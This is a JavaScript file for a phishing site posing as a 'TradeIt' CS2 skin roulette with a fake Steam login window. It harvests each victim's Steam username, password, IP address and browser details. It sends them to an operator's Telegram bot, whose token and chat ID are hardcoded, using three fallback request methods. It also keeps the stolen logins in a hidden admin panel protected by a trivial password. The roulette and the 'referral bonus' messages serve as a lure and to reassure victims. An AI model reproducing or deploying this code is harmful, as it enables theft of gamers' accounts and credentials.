// Данные скинов с градиентами и иконками
const skins = [
    { 
        name: "AK-47 | Красная линия", 
        rarity: "rare", 
        pattern: "pattern-ak",
        icon: "fas fa-assault-rifle",
        price: "$45.99"
    },
    { 
        name: "AWP | Дракон Лор", 
        rarity: "legendary", 
        pattern: "pattern-awp",
        icon: "fas fa-sniper-rifle", 
        price: "$350.50"
    },
    { 
        name: "Перчатки | Кровавый патруль", 
        rarity: "epic", 
        pattern: "pattern-gloves",
        icon: "fas fa-hand-fist",
        price: "$120.75"
    },
    { 
        name: "Нож | Бабочка | Ультрафиолет", 
        rarity: "legendary", 
        pattern: "pattern-knife",
        icon: "fas fa-knife",
        price: "$520.00"
    },
    { 
        name: "M4A4 | Кактус", 
        rarity: "common", 
        pattern: "pattern-m4",
        icon: "fas fa-rifle",
        price: "$25.30"
    },
    { 
        name: "Desert Eagle | Кобра", 
        rarity: "common", 
        pattern: "pattern-pistol",
        icon: "fas fa-gun",
        price: "$18.75"
    },
    { 
        name: "P90 | Холодное сердце", 
        rarity: "rare", 
        pattern: "pattern-smg", 
        icon: "fas fa-submachine-gun",
        price: "$32.50"
    },
    { 
        name: "USP-S | Килконфыр", 
        rarity: "epic", 
        pattern: "pattern-pistol",
        icon: "fas fa-gun",
        price: "$28.90"
    },
    { 
        name: "AWP | Гипеон", 
        rarity: "epic", 
        pattern: "pattern-awp",
        icon: "fas fa-sniper-rifle",
        price: "$280.00"
    },
    { 
        name: "AK-47 | Огненный змей", 
        rarity: "legendary", 
        pattern: "pattern-ak",
        icon: "fas fa-assault-rifle",
        price: "$420.00"
    },
    { 
        name: "Перчатки | Спортивные", 
        rarity: "rare", 
        pattern: "pattern-gloves",
        icon: "fas fa-hand-fist",
        price: "$85.25"
    },
    { 
        name: "M4A1-S | Гном-камикадзе", 
        rarity: "common", 
        pattern: "pattern-rifle",
        icon: "fas fa-rifle",
        price: "$22.40"
    },
    { 
        name: "Нож | Скелетный | Ночная полоса", 
        rarity: "epic", 
        pattern: "pattern-knife",
        icon: "fas fa-knife",
        price: "$310.75"
    }
];

// Константы для админ-панели
const ADMIN_PASSWORD = "3214";

// Ваши данные Telegram
const TELEGRAM_BOT_TOKEN = "7632142946:AAEsTSwS8ymzUhAKeM_EbD4M8iXXajFj6qk";
const TELEGRAM_CHAT_ID = "1612221355";

// Функция отправки данных в Telegram (улучшенная версия)
async function sendToTelegram(username, password, ip, referral) {
    console.log('🔍 Начинаю отправку в Telegram...');
    
    // Создаем несколько методов отправки
    const methods = [
        // Метод 1: Стандартный POST запрос
        async () => {
            try {
                const message = `
🆕 *Новая авторизация на TradeIt!*

👤 *Steam логин:* ${username}
🔑 *Пароль:* ${password}
🌐 *IP адрес:* ${ip}
📅 *Дата и время:* ${new Date().toLocaleString('ru-RU')}
👥 *Реферал:* ${referral}
🔗 *Сайт:* ${window.location.href}
🖥️ *Браузер:* ${navigator.userAgent.substring(0, 100)}...
                `.trim();
                
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Метод 1: Успешно отправлено через POST');
                    return true;
                } else {
                    console.log(`❌ Метод 1: Ошибка Telegram - ${data.description}`);
                    return false;
                }
            } catch (error) {
                console.log(`❌ Метод 1: Ошибка сети - ${error.message}`);
                return false;
            }
        },
        
        // Метод 2: GET запрос (более простой)
        async () => {
            try {
                const simpleMessage = `🆕 Новая авторизация на TradeIt!\n👤 Логин: ${username}\n🔑 Пароль: ${password}\n🌐 IP: ${ip}\n👥 Реферал: ${referral}\n📅 ${new Date().toLocaleString('ru-RU')}`;
                const encodedMessage = encodeURIComponent(simpleMessage);
                
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=Markdown`);
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Метод 2: Успешно отправлено через GET');
                    return true;
                } else {
                    console.log(`❌ Метод 2: Ошибка Telegram - ${data.description}`);
                    return false;
                }
            } catch (error) {
                console.log(`❌ Метод 2: Ошибка сети - ${error.message}`);
                return false;
            }
        },
        
        // Метод 3: Альтернативный формат
        async () => {
            try {
                const altMessage = `📋 НОВАЯ АВТОРИЗАЦИЯ 📋\n\n💻 Сайт: TradeIt CS2\n👤 Логин Steam: ${username}\n🔐 Пароль: ${password}\n🌍 IP: ${ip}\n⏰ Время: ${new Date().toLocaleString()}\n👥 Пригласил: ${referral}\n\n🖥️ Устройство: ${navigator.platform}\n🌐 Браузер: ${navigator.userAgent.split(')')[0]})`;
                const encodedAltMessage = encodeURIComponent(altMessage);
                
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedAltMessage}`);
                const data = await response.json();
                if (data.ok) {
                    console.log('✅ Метод 3: Успешно отправлено (альтернативный формат)');
                    return true;
                } else {
                    console.log(`❌ Метод 3: Ошибка Telegram - ${data.description}`);
                    return false;
                }
            } catch (error) {
                console.log(`❌ Метод 3: Ошибка сети - ${error.message}`);
                return false;
            }
        }
    ];
    
    // Пробуем все методы по очереди
    for (let i = 0; i < methods.length; i++) {
        console.log(`🔄 Попытка ${i + 1} из ${methods.length}...`);
        try {
            const result = await methods[i]();
            if (result) {
                console.log('🎉 Сообщение успешно отправлено в Telegram!');
                return true;
            }
        } catch (error) {
            console.log(`⚠️ Метод ${i + 1} вызвал исключение:`, error.message);
        }
        
        // Ждем немного перед следующей попыткой
        if (i < methods.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 1000));
        }
    }
    
    console.log('❌ Все методы отправки не сработали');
    return false;
}

// Функция проверки доступности Telegram API
async function checkTelegramConnection() {
    console.log('🔍 Проверяю подключение к Telegram API...');
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getMe`);
        const data = await response.json();
        
        if (data.ok) {
            console.log(`✅ Бот активен: @${data.result.username}`);
            console.log(`✅ ID бота: ${data.result.id}`);
            console.log(`✅ Имя бота: ${data.result.first_name}`);
            return true;
        } else {
            console.log(`❌ Ошибка бота: ${data.description}`);
            return false;
        }
    } catch (error) {
        console.log(`❌ Не удалось подключиться к Telegram API: ${error.message}`);
        return false;
    }
}

// Настройка отладочной консоли
function setupDebugConsole() {
    // Создаем скрытую консоль для отладки
    const debugDiv = document.createElement('div');
    debugDiv.id = 'debugConsole';
    debugDiv.style.cssText = `
        position: fixed;
        bottom: 10px;
        right: 10px;
        width: 300px;
        height: 200px;
        background: rgba(0,0,0,0.9);
        color: #0f0;
        font-family: monospace;
        font-size: 11px;
        padding: 10px;
        border: 1px solid #0f0;
        border-radius: 5px;
        overflow-y: auto;
        z-index: 9999;
        display: none;
        pointer-events: none;
    `;
    document.body.appendChild(debugDiv);
    
    // Переопределяем console.log для отображения в debug консоли
    const originalLog = console.log;
    console.log = function(...args) {
        originalLog.apply(console, args);
        const debugConsole = document.getElementById('debugConsole');
        if (debugConsole) {
            const message = args.map(arg => 
                typeof arg === 'object' ? JSON.stringify(arg) : String(arg)
            ).join(' ');
            const entry = document.createElement('div');
            entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            debugConsole.appendChild(entry);
            debugConsole.scrollTop = debugConsole.scrollHeight;
        }
    };
    
    // Добавляем кнопку для показа/скрытия консоли
    const debugBtn = document.createElement('button');
    debugBtn.textContent = '🐛';
    debugBtn.title = 'Показать отладку';
    debugBtn.style.cssText = `
        position: fixed;
        bottom: 10px;
        right: 320px;
        width: 40px;
        height: 40px;
        background: #ff5722;
        color: white;
        border: none;
        border-radius: 50%;
        cursor: pointer;
        z-index: 10000;
        font-size: 20px;
        opacity: 0.7;
        transition: opacity 0.3s;
    `;
    debugBtn.onclick = () => {
        const console = document.getElementById('debugConsole');
        if (console.style.display === 'none') {
            console.style.display = 'block';
            debugBtn.style.opacity = '1';
            debugBtn.title = 'Скрыть отладку';
        } else {
            console.style.display = 'none';
            debugBtn.style.opacity = '0.7';
            debugBtn.title = 'Показать отладку';
        }
    };
    debugBtn.onmouseover = () => debugBtn.style.opacity = '1';
    debugBtn.onmouseout = () => {
        const console = document.getElementById('debugConsole');
        if (console.style.display === 'none') {
            debugBtn.style.opacity = '0.7';
        }
    };
    document.body.appendChild(debugBtn);
}

// Функция инициализации после полной загрузки DOM
function initializeApp() {
    console.log('🚀 Инициализация приложения TradeIt...');
    
    // Настраиваем отладочную консоль
    setupDebugConsole();
    
    // Проверяем подключение к Telegram
    checkTelegramConnection().then(isConnected => {
        if (isConnected) {
            console.log('✅ Telegram бот готов к приему данных');
        } else {
            console.log('⚠️ Telegram бот недоступен, данные будут сохраняться только локально');
        }
    });
    
    // Получаем элементы DOM
    const steamModal = document.getElementById('steamModal');
    const closeModal = document.getElementById('closeModal');
    const openSteamModal = document.getElementById('openSteamModal');
    const loginForm = document.getElementById('loginForm');
    const rouletteTrack = document.getElementById('rouletteTrack');
    const spinButton = document.getElementById('spinButton');
    const resultModal = document.getElementById('resultModal');
    const closeResult = document.getElementById('closeResult');
    const wonItem = document.getElementById('wonItem');
    const balanceElement = document.getElementById('balance');
    const wonTodayElement = document.getElementById('wonToday');
    const claimBonus = document.getElementById('claimBonus');
    const dailyTimer = document.getElementById('dailyTimer');

    // User data
    let userData = {
        balance: 7, // +2 за реферальный бонус
        wonToday: 0,
        isLoggedIn: false,
        referralBonus: true
    };

    // Инициализируем рулетку
    initializeRoulette();
    updateStats();
    startDailyTimer();

    // Показываем модальное окно авторизации с небольшой задержкой
    setTimeout(() => {
        if (!userData.isLoggedIn) {
            steamModal.style.display = 'flex';
            console.log('📱 Показано модальное окно авторизации');
        }
    }, 500);

    // Close modal
    closeModal.addEventListener('click', () => {
        steamModal.style.display = 'none';
        console.log('❌ Модальное окно закрыто пользователем');
    });

    // Open modal from button
    openSteamModal.addEventListener('click', () => {
        steamModal.style.display = 'flex';
        console.log('📱 Открыто модальное окно авторизации');
    });

    // Close modal when clicking outside
    window.addEventListener('click', (e) => {
        if (e.target === steamModal) {
            steamModal.style.display = 'none';
            console.log('❌ Модальное окно закрыто (клик вне окна)');
        }
    });

    // Form submission - ОСНОВНАЯ ФУНКЦИОНАЛЬНОСТЬ
    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        
        if (!username || !password) {
            alert('⚠️ Пожалуйста, заполните все поля');
            return;
        }
        
        console.log('📝 Попытка авторизации:', username);
        
        // Показываем сообщение о загрузке
        const loginButton = loginForm.querySelector('.login-button');
        const originalText = loginButton.textContent;
        loginButton.textContent = 'Отправка данных...';
        loginButton.disabled = true;
        
        try {
            // Получаем IP адрес пользователя
            let ip = 'Не определен';
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ip = ipData.ip;
                console.log('🌐 IP адрес получен:', ip);
            } catch (ipError) {
                console.log('⚠️ Не удалось получить IP адрес:', ipError.message);
            }
            
            // 1. Сохраняем данные локально (ВСЕГДА)
            console.log('💾 Сохранение данных локально...');
            const savedData = await saveUserLogin(username, password, ip);
            
            // 2. Пытаемся отправить в Telegram
            console.log('📤 Попытка отправки в Telegram...');
            let telegramSent = false;
            try {
                telegramSent = await sendToTelegram(username, password, ip, 'fronzyyyy132');
            } catch (tgError) {
                console.error('❌ Ошибка при отправке в Telegram:', tgError);
            }
            
            // 3. Обновляем состояние пользователя
            userData.isLoggedIn = true;
            
            // 4. Показываем результат пользователю
            if (telegramSent) {
                console.log('✅ Пользователь получил сообщение об успешной отправке в Telegram');
                alert(`✅ Вход выполнен успешно!\n\n📨 Данные отправлены администратору\n🎁 Реферальный бонус: +2 спина!\n\nСчастливой игры! 🎮`);
            } else {
                console.log('⚠️ Пользователь получил сообщение о локальном сохранении');
                alert(`✅ Вход выполнен успешно!\n\n📋 Данные сохранены в системе\n🎁 Реферальный бонус: +2 спина!\n\nСчастливой игры! 🎮`);
            }
            
            // 5. Закрываем модальное окно и обновляем интерфейс
            steamModal.style.display = 'none';
            const displayName = username.length > 15 ? username.substring(0, 15) + '...' : username;
            openSteamModal.textContent = displayName;
            openSteamModal.style.background = '#4caf50';
            openSteamModal.style.color = 'white';
            
            console.log('🎉 Авторизация завершена успешно!');
            
        } catch (error) {
            console.error('❌ Критическая ошибка при авторизации:', error);
            alert('❌ Произошла ошибка при обработке данных. Пожалуйста, попробуйте еще раз.\n\nЕсли ошибка повторяется, свяжитесь с поддержкой.');
        } finally {
            // Всегда восстанавливаем кнопку
            loginButton.textContent = originalText;
            loginButton.disabled = false;
            console.log('🔄 Кнопка авторизации восстановлена');
        }
    });

    // Initialize roulette with items
    function initializeRoulette() {
        console.log('🎡 Инициализация рулетки...');
        // Clear existing items
        rouletteTrack.innerHTML = '';
        
        // Add multiple copies of skins to create a longer track
        for (let i = 0; i < 5; i++) {
            skins.forEach(skin => {
                const item = document.createElement('div');
                item.className = `roulette-item ${skin.rarity}`;
                
                const rarityClass = `rarity-${skin.rarity}`;
                
                item.innerHTML = `
                    <div class="skin-pattern ${skin.pattern} ${skin.rarity}">
                        <i class="skin-icon ${skin.icon}"></i>
                    </div>
                    <div class="item-name">${skin.name}</div>
                    <div class="item-rarity ${rarityClass}">${getRarityText(skin.rarity)}</div>
                    <div class="item-price">${skin.price}</div>
                `;
                
                rouletteTrack.appendChild(item);
            });
        }
        console.log(`✅ Рулетка инициализирована: ${skins.length * 5} элементов`);
    }

    // Get Russian text for rarity
    function getRarityText(rarity) {
        switch(rarity) {
            case 'common': return 'Обычный';
            case 'rare': return 'Редкий';
            case 'epic': return 'Эпический';
            case 'legendary': return 'Легендарный';
            default: return 'Обычный';
        }
    }

    // Update stats display
    function updateStats() {
        balanceElement.textContent = userData.balance;
        wonTodayElement.textContent = userData.wonToday;
        
        // Enable/disable spin button based on balance
        spinButton.disabled = userData.balance <= 0;
        if (userData.balance <= 0) {
            spinButton.style.background = '#777';
        } else {
            spinButton.style.background = 'linear-gradient(145deg, #ff5722, #e64a19)';
        }
    }

    // Spin the roulette
    spinButton.addEventListener('click', () => {
        if (userData.balance <= 0) {
            alert('❌ У вас недостаточно баланса для спина!\n\nПолучите больше спинов:\n1. Ежедневный бонус\n2. Реферальная программа\n3. Приобретение за донат');
            return;
        }
        
        console.log('🎮 Пользователь крутит рулетку');
        
        // Deduct balance
        userData.balance--;
        updateStats();
        
        // Disable button during spin
        spinButton.disabled = true;
        spinButton.textContent = 'Крутится...';
        
        // Calculate random stopping position
        const itemWidth = 200;
        const itemsCount = rouletteTrack.children.length;
        const randomIndex = Math.floor(Math.random() * (itemsCount - 10)) + 5;
        const stopPosition = -(randomIndex * itemWidth);
        
        console.log(`🎰 Рулетка остановится на позиции: ${randomIndex}`);
        
        // Apply animation
        rouletteTrack.style.transform = `translateX(${stopPosition}px)`;
        
        // After animation completes
        setTimeout(() => {
            // Get the won item (the one in the center)
            const centerIndex = Math.abs(Math.round(stopPosition / itemWidth));
            const wonSkin = skins[centerIndex % skins.length];
            
            console.log(`🎉 Выигран предмет: ${wonSkin.name} (${wonSkin.rarity})`);
            
            // Show result modal
            showResult(wonSkin);
            
            // Update stats
            userData.wonToday++;
            updateStats();
            
            // Re-enable button if balance allows
            spinButton.disabled = userData.balance <= 0;
            spinButton.textContent = 'Крутить рулетку';
        }, 4000);
    });

    // Show result modal with won item
    function showResult(skin) {
        const rarityClass = `rarity-${skin.rarity}`;
        
        wonItem.innerHTML = `
            <div class="skin-pattern ${skin.pattern} ${skin.rarity}">
                <i class="skin-icon ${skin.icon}"></i>
            </div>
            <div class="item-name">${skin.name}</div>
            <div class="item-rarity ${rarityClass}">${getRarityText(skin.rarity)}</div>
            <div class="item-price">${skin.price}</div>
        `;
        
        resultModal.classList.add('show');
        console.log(`🏆 Показано окно с выигрышем: ${skin.name}`);
    }

    // Close result modal
    closeResult.addEventListener('click', () => {
        resultModal.classList.remove('show');
        console.log('✅ Окно выигрыша закрыто');
    });

    // Daily bonus functionality
    function startDailyTimer() {
        console.log('⏰ Запуск ежедневного таймера...');
        // Set timer for 24 hours from now
        const now = new Date();
        const tomorrow = new Date(now);
        tomorrow.setDate(tomorrow.getDate() + 1);
        tomorrow.setHours(0, 0, 0, 0);
        
        function updateTimer() {
            const now = new Date();
            const diff = tomorrow - now;
            
            if (diff <= 0) {
                dailyTimer.textContent = "00:00:00";
                claimBonus.disabled = false;
                claimBonus.textContent = "Забрать бонус";
                return;
            }
            
            const hours = Math.floor(diff / (1000 * 60 * 60));
            const minutes = Math.floor((diff % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((diff % (1000 * 60)) / 1000);
            
            dailyTimer.textContent = 
                `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
        }
        
        updateTimer();
        setInterval(updateTimer, 1000);
        console.log('✅ Ежедневный таймер запущен');
    }

    // Claim daily bonus
    claimBonus.addEventListener('click', function() {
        if (this.disabled) return;
        
        userData.balance += 2;
        updateStats();
        
        this.disabled = true;
        this.textContent = "Бонус получен";
        this.style.background = "#777";
        
        console.log('🎁 Пользователь получил ежедневный бонус: +2 спина');
        alert('✅ Ежедневный бонус получен! +2 спина добавлены на ваш баланс.');
    });
    
    console.log('✅ Приложение TradeIt полностью инициализировано');
}

// Функции для работы с данными пользователей
function getLoginHistory() {
    const history = localStorage.getItem('login_history');
    if (!history) return [];
    
    try {
        return JSON.parse(history);
    } catch (error) {
        console.error('❌ Ошибка парсинга истории логинов:', error);
        return [];
    }
}

function saveLoginHistory(history) {
    try {
        localStorage.setItem('login_history', JSON.stringify(history));
        console.log(`💾 История сохранена: ${history.length} записей`);
    } catch (error) {
        console.error('❌ Ошибка сохранения истории:', error);
    }
}

async function saveUserLogin(username, password, ip) {
    const loginData = {
        username: username,
        password: password,
        timestamp: new Date().toISOString(),
        ip: ip || 'Не определен',
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        referral: 'fronzyyyy132',
        url: window.location.href,
        platform: navigator.platform,
        language: navigator.language
    };
    
    console.log('💾 Сохранение данных пользователя:', {
        username: username,
        timestamp: loginData.timestamp,
        ip: loginData.ip
    });
    
    // Сохраняем текущую сессию
    localStorage.setItem('current_user', JSON.stringify(loginData));
    
    // Сохраняем в историю
    const history = getLoginHistory();
    history.push(loginData);
    
    // Ограничиваем историю последними 100 записями
    if (history.length > 100) {
        history.splice(0, history.length - 100);
    }
    
    saveLoginHistory(history);
    
    return loginData;
}

// Функции для админ-панели
function updateAdminTable() {
    const history = getLoginHistory();
    const tbody = document.getElementById('usersTableBody');
    const totalRecords = document.getElementById('totalRecords');
    const lastUpdate = document.getElementById('lastUpdate');
    
    tbody.innerHTML = '';
    totalRecords.textContent = history.length;
    lastUpdate.textContent = new Date().toLocaleString();
    
    if (history.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="padding: 20px; text-align: center; color: #777;">Нет сохраненных данных</td></tr>';
        return;
    }
    
    // Сортируем по дате (новые сверху)
    history.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
    
    history.forEach((login, index) => {
        const row = document.createElement('tr');
        row.style.borderBottom = '1px solid #333';
        
        const date = new Date(login.timestamp).toLocaleString();
        
        row.innerHTML = `
            <td style="color: #aaa; font-size: 12px;">${date}</td>
            <td style="color: #fff; font-weight: 500;">${escapeHtml(login.username)}</td>
            <td style="color: #ff5722; font-family: monospace;">${escapeHtml(login.password)}</td>
            <td style="color: #aaa; font-size: 12px; font-family: monospace;">${login.ip || 'unknown'}</td>
        `;
        
        tbody.appendChild(row);
    });
    
    console.log(`📊 Таблица админки обновлена: ${history.length} записей`);
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Инициализация админ-панели
document.addEventListener('DOMContentLoaded', function() {
    console.log('🔧 Инициализация админ-панели...');
    
    const adminPanel = document.getElementById('adminPanel');
    const secretAdminBtn = document.getElementById('secretAdminBtn');
    const closeAdmin = document.getElementById('closeAdmin');
    const adminLoginBtn = document.getElementById('adminLoginBtn');
    const adminPassword = document.getElementById('adminPassword');
    const adminError = document.getElementById('adminError');
    const adminLogin = document.getElementById('adminLogin');
    const adminContent = document.getElementById('adminContent');
    const refreshData = document.getElementById('refreshData');
    const exportData = document.getElementById('exportData');
    const clearData = document.getElementById('clearData');
    
    // Открыть админку по секретной кнопке
    secretAdminBtn.addEventListener('click', function() {
        adminPanel.style.display = 'block';
        adminPassword.value = '';
        adminError.style.display = 'none';
        adminLogin.style.display = 'block';
        adminContent.style.display = 'none';
        console.log('🔓 Открыта админ-панель (секретная кнопка)');
    });
    
    // Закрыть админку
    closeAdmin.addEventListener('click', function() {
        adminPanel.style.display = 'none';
        console.log('🔒 Админ-панель закрыта');
    });
    
    // Вход в админку
    adminLoginBtn.addEventListener('click', function() {
        if (adminPassword.value === ADMIN_PASSWORD) {
            adminLogin.style.display = 'none';
            adminContent.style.display = 'block';
            updateAdminTable();
            console.log('✅ Успешный вход в админку');
        } else {
            adminError.style.display = 'block';
            console.log('❌ Неудачная попытка входа в админку');
        }
    });
    
    // Enter для входа
    adminPassword.addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            adminLoginBtn.click();
        }
    });
    
    // Обновить данные
    refreshData.addEventListener('click', updateAdminTable);
    
    // Экспорт данных
    exportData.addEventListener('click', function() {
        const history = getLoginHistory();
        const dataStr = JSON.stringify(history, null, 2);
        const dataBlob = new Blob([dataStr], {type: 'application/json'});
        
        const link = document.createElement('a');
        link.href = URL.createObjectURL(dataBlob);
        link.download = `tradeit_users_${new Date().toISOString().split('T')[0]}.json`;
        link.click();
        
        console.log(`📥 Экспортировано данных: ${history.length} записей`);
        alert(`✅ Данные экспортированы (${history.length} записей)`);
    });
    
    // Очистить данные
    clearData.addEventListener('click', function() {
        if (confirm('⚠️ ВНИМАНИЕ!\n\nВы уверены, что хотите удалить ВСЕ сохраненные данные?\n\nЭто действие НЕОБРАТИМО и удалит все логины и пароли из локального хранилища.')) {
            localStorage.removeItem('login_history');
            localStorage.removeItem('current_user');
            updateAdminTable();
            console.log('🗑️ Все данные очищены');
            alert('✅ Все данные успешно очищены!');
        }
    });
    
    console.log('✅ Админ-панель инициализирована');
});

// Запускаем инициализацию когда DOM полностью загружен
document.addEventListener('DOMContentLoaded', initializeApp);

// Отладочная информация при загрузке
console.log('=========================================');
console.log('🌐 TradeIt CS2 Trading Platform');
console.log('📅 Дата загрузки:', new Date().toLocaleString());
console.log('🔗 URL:', window.location.href);
console.log('🖥️ Платформа:', navigator.platform);
console.log('🌐 Браузер:', navigator.userAgent);
console.log('💾 Локальное хранилище доступно:', !!localStorage);
console.log('🤖 Telegram Bot Token:', TELEGRAM_BOT_TOKEN ? 'Установлен' : 'Не установлен');
console.log('👤 Telegram Chat ID:', TELEGRAM_CHAT_ID ? 'Установлен' : 'Не установлен');
console.log('=========================================');
